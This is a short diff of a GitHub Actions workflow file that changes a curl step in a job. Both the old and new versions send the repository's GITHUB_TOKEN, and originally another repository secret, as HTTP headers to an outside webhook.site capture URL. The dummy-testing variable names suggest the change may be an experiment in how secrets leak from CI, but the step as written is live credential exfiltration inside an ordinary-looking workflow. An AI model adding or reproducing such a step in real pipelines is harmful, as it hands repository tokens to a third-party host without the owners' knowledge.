@@ -38,4 +38,4 @@ jobs:
           DUMMY_TESTING_VAR: ${{ env.DUMMY_TESTING_VAR }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          curl https://webhook.site/ee78d3e7-7f24-48d4-8659-9c8962c36b3c -H "X-API-Key: $GITHUB_TOKEN" -H "Key2: ${{ secrets.DUMMY_TESTING_SECRET }}" -d "comment_body=teste"
+          curl https://webhook.site/ee78d3e7-7f24-48d4-8659-9c8962c36b3c -H "X-API-Key: $GITHUB_TOKEN" -H "Key2: $GITHUB_TOKEN" -d "comment_body=teste"
